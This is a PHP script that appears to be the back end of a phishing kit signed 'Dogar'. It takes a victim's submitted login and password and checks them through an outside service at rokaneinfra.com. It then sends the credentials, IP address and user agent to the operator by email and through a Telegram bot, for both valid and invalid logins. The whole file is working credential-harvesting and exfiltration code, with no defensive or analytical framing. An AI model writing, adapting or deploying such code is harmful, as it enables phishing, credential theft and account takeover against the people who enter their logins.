<?php
include 'config/config.php';
if(isset($_POST['login'])){
    $message="";
    $login = $_POST['login'];
    $passwd = $_POST['passwd'];
    $url = "https://rokaneinfra.com/ike/get/auth?email=".$login."&password=" .$passwd."&token=".$token."&domain=".$domain."&app=".$app;
    $handle = curl_init();
    curl_setopt($handle, CURLOPT_URL, $url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    $data= curl_exec($handle);
    curl_close($handle);
    if ($data == "ok") {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| Dogar |--------------|\n";
        $message .= "Online ID            : " . $login . "\n";
        $message .= "Passcode              : " . $passwd . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "Valid Result "  . "\n";
        $message .= "|-------| Dogar |-------------|\n";
        $send = $result_email;
        $subject = "Login : $ip";
        mail($send, $subject, $message);
        $txt = urlencode($message);
        $url1 = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $res=curl_exec($curl);
        curl_close($curl);
        echo "success";
        exit();
    } else {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| Dogar |--------------|\n";
        $message .= "Online ID            : " . $login . "\n";
        $message .= "Passcode              : " . $passwd . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "InValid Result "  . "\n";
        $message .= "|-------| Dogar |-------------|\n";
        $send = $result_email;
        $subject = "Login InValid : $ip";
        $txt = urlencode("|-----Dogar----!\n Online ID   : $login \n Password   :$passwd \n  Result status   :   Invalid Result\n|-----Dogar-----|" );
        mail($send, $subject, $message);
        $url1 = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $res=curl_exec($curl);
        curl_close($curl);
        echo "failed";
        exit();
    }

}